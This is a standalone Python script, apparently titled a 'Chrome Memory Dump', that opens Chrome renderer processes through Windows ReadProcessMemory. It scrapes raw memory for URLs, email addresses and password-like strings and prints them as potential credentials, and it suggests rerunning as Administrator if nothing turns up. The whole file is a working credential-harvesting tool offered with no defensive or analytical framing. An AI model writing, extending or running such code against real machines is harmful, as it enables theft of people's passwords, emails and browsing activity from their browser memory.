"""
Simplified Chrome Memory Dump - Focus on accessible memory regions
"""
import ctypes
import psutil
import re
import os

def dump_chrome_simple():
    print("="*60)
    print("Chrome Memory Dump v2 - Simplified Approach")
    print("="*60)
    
    # Find Chrome renderer processes (these handle web pages)
    chrome_pids = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if 'chrome.exe' in proc.info['name'].lower():
                # Prefer renderer processes (they have --type=renderer)
                cmdline = ' '.join(proc.info.get('cmdline', []))
                if '--type=renderer' in cmdline or '--type=' not in cmdline:
                    chrome_pids.append(proc.info['pid'])
        except:
            pass
    
    if not chrome_pids:
        print("❌ No Chrome processes found")
        return
    
    print(f"✅ Found {len(chrome_pids)} Chrome processes")
    
    # Windows API
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    kernel32 = ctypes.windll.kernel32
    
    all_urls = set()
    all_strings = []
    
    # Scan first 3 processes only
    for pid in chrome_pids[:3]:
        print(f"\n📊 Scanning PID {pid}...")
        
        try:
            h_process = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
            if not h_process:
                print(f"  ⚠️ Cannot open process (may need admin)")
                continue
            
            # Use simpler approach - scan specific memory ranges
            # Start at 0x10000 and scan in 1MB chunks
            for base in range(0x10000, 0x7FF00000, 0x100000):  # Scan up to 2GB in 1MB chunks
                try:
                    # Try to read 1MB
                    buffer = ctypes.create_string_buffer(0x100000)
                    bytes_read = ctypes.c_size_t()
                    
                    if kernel32.ReadProcessMemory(h_process, base, buffer, 0x100000, ctypes.byref(bytes_read)):
                        if bytes_read.value > 0:
                            data = buffer.raw[:bytes_read.value]
                            
                            # Look for URLs
                            urls = re.findall(rb'https?://[a-zA-Z0-9\-\.]+\.[a-z]{2,}[^\s\x00]{0,100}', data)
                            for url in urls:
                                try:
                                    url_str = url.decode('utf-8', errors='ignore')
                                    if len(url_str) > 10:
                                        all_urls.add(url_str)
                                except:
                                    pass
                            
                            # Look for email-like strings
                            emails = re.findall(rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', data)
                            for email in emails:
                                try:
                                    email_str = email.decode('utf-8', errors='ignore')
                                    all_strings.append(f"Email: {email_str}")
                                except:
                                    pass
                            
                            # Look for password-like strings (6-30 chars, mixed case)
                            passwords = re.findall(rb'[a-zA-Z0-9!@#$%^&*]{6,30}', data)
                            for pwd in passwords[:10]:  # Limit to first 10
                                try:
                                    pwd_str = pwd.decode('utf-8', errors='ignore')
                                    # Basic heuristic - has uppercase and lowercase
                                    if any(c.isupper() for c in pwd_str) and any(c.islower() for c in pwd_str):
                                        all_strings.append(f"Potential: {pwd_str}")
                                except:
                                    pass
                
                except:
                    continue
            
            kernel32.CloseHandle(h_process)
            print(f"  ✅ Scan complete")
            
        except Exception as e:
            print(f"  ❌ Error: {e}")
    
    # Results
    print("\n" + "="*60)
    print("RESULTS")
    print("="*60)
    
    if all_urls:
        print(f"\n🌐 Found {len(all_urls)} URLs:")
        for url in sorted(all_urls)[:20]:  # Show first 20
            print(f"  - {url}")
    
    if all_strings:
        print(f"\n🔑 Found {len(all_strings)} potential credentials:")
        for s in all_strings[:30]:  # Show first 30
            print(f"  - {s}")
    
    if not all_urls and not all_strings:
        print("\n⚠️ No data found. This could mean:")
        print("  - Chrome memory is protected")
        print("  - Need to run as Administrator")
        print("  - No active login sessions")
        print("\n💡 Try running PowerShell as Administrator and run this script again")

if __name__ == "__main__":
    dump_chrome_simple()
